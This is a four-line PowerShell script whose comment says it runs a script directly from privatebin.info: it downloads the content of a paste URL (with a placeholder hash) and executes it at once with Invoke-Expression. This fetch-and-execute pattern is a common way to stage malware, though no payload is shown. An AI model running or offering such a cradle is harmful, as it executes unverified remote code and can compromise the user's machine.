#this script will run a script directly from privatebin.info
$url = "https://privatebin.info/?<HASH>"
$script = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
Invoke-Expression $script